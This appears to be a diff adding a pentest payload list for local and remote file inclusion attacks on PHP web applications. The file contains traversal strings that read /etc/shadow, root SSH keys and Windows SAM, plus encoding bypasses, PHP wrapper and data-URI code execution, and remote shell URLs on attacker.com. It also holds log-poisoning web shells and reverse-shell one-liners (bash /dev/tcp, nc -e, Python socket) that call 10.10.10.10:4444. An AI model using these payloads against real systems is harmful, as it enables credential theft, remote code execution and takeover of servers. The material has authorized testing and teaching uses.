@@ -1,0 +1,221 @@
+# File Inclusion Payloads
+
+# === LFI Payloads ===
+
+# Basic Directory Traversal
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+
+# Linux - Common Files
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../etc/group
+../../../../../../etc/hosts
+../../../../../../etc/hostname
+../../../../../../etc/issue
+../../../../../../etc/mysql/my.cnf
+../../../../../../etc/apache2/apache2.conf
+../../../../../../etc/nginx/nginx.conf
+../../../../../../etc/ssh/sshd_config
+../../../../../../root/.ssh/id_rsa
+../../../../../../root/.ssh/authorized_keys
+../../../../../../root/.bash_history
+../../../../../../home/user/.bash_history
+
+# Logs
+../../../../../../var/log/apache2/access.log
+../../../../../../var/log/apache2/error.log
+../../../../../../var/log/nginx/access.log
+../../../../../../var/log/nginx/error.log
+../../../../../../var/log/auth.log
+../../../../../../var/log/syslog
+../../../../../../var/log/mysql/error.log
+
+# Proc Filesystem
+../../../../../../proc/self/environ
+../../../../../../proc/self/cmdline
+../../../../../../proc/self/stat
+../../../../../../proc/self/status
+../../../../../../proc/self/fd/0
+../../../../../../proc/self/fd/1
+../../../../../../proc/self/fd/2
+../../../../../../proc/version
+../../../../../../proc/cpuinfo
+../../../../../../proc/meminfo
+
+# Application Files
+../../../../../../var/www/html/index.php
+../../../../../../var/www/html/config.php
+../../../../../../var/www/html/includes/config.inc.php
+../config.php
+../database.php
+../includes/config.php
+../.env
+../composer.json
+../package.json
+
+# Windows Files
+../../../../../../windows/win.ini
+../../../../../../windows/system.ini
+../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../windows/repair/SAM
+../../../../../../windows/system32/config/SAM
+../../../../../../xampp/apache/conf/httpd.conf
+../../../../../../xampp/apache/logs/access.log
+../../../../../../xampp/mysql/data/mysql/user.MYD
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+
+# === Null Byte Injection (PHP < 5.3) ===
+../../../../../../etc/passwd%00
+../../../../../../etc/passwd%00.jpg
+../../../../../../etc/passwd%00.php
+../../../../../../etc/passwd%2500
+
+# === URL Encoding ===
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252f..%252fetc%252fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# === Path Traversal Variations ===
+....//....//....//....//etc/passwd
+..///////..////..//////etc/passwd
+/var/www/../../etc/passwd
+
+# === PHP Wrappers ===
+
+# php://filter - Read source code (Base64)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/read=convert.base64-encode/resource=../config.php
+php://filter/resource=../../../../../../etc/passwd
+
+# php://filter - ROT13
+php://filter/read=string.rot13/resource=index.php
+
+# php://input - POST data execution
+php://input
+[POST DATA]: <?php system('whoami'); ?>
+
+# data://
+data://text/plain,<?php system('whoami'); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
+data:text/plain,<?php phpinfo(); ?>
+
+# expect://
+expect://whoami
+expect://id
+expect://ls
+
+# === RFI Payloads ===
+
+# Basic RFI
+http://attacker.com/shell.txt
+http://attacker.com/shell.php
+https://attacker.com/payload.txt
+
+# With Null Byte (PHP < 5.3)
+http://attacker.com/shell.txt%00
+http://attacker.com/shell.txt%00.jpg
+
+# With Question Mark
+http://attacker.com/shell.txt?
+http://attacker.com/shell.txt?.jpg
+
+# With Hash
+http://attacker.com/shell.txt%23
+http://attacker.com/shell.txt#.jpg
+
+# FTP
+ftp://attacker.com/shell.txt
+ftp://user:pass@attacker.com/shell.txt
+
+# SMB (Windows)
+\\attacker.com\share\shell.php
+//attacker.com/share/shell.php
+
+# Data URI
+data://text/plain,<?php system($_GET['cmd']); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+# === Log Poisoning ===
+
+# Apache Access Log
+../../../../../../var/log/apache2/access.log
+[Inject in User-Agent]: <?php system($_GET['cmd']); ?>
+
+# Nginx Access Log
+../../../../../../var/log/nginx/access.log
+[Inject in User-Agent]: <?php system($_GET['cmd']); ?>
+
+# SSH Log
+../../../../../../var/log/auth.log
+[SSH as]: <?php system($_GET['cmd']); ?>@target.com
+
+# Mail Log
+../../../../../../var/log/mail.log
+[Send email with PHP in header]
+
+# === Zip Wrapper ===
+zip://uploads/file.zip%23shell.php
+zip:///tmp/shell.zip%23shell
+phar://uploads/file.phar/shell.php
+
+# === Advanced Bypasses ===
+
+# Mixed Encoding
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+
+# Case Variation (Windows)
+..\..\..\..\windows\win.ini
+..\..\..\..\..\EtC\pAsSwD
+
+# Overlong UTF-8
+..%c0%ae%c0%ae/..%c0%ae%c0%ae/etc/passwd
+
+# === Common Parameters ===
+
+?file=
+?page=
+?include=
+?inc=
+?path=
+?module=
+?lang=
+?doc=
+?template=
+?section=
+?style=
+?pdf=
+?cat=
+?action=
+?board=
+?date=
+?detail=
+?download=
+?prefix=
+?suffix=
+
+# === Chaining with Command Execution ===
+
+# After successful LFI/RFI
+&cmd=whoami
+&cmd=id
+&cmd=uname -a
+&cmd=cat /etc/passwd
+&cmd=ls -la
+&cmd=pwd
+&cmd=cat config.php
+&cmd=netstat -an
+&cmd=ps aux
+
+# Reverse Shell
+&cmd=bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+&cmd=nc -e /bin/sh 10.10.10.10 4444
+&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
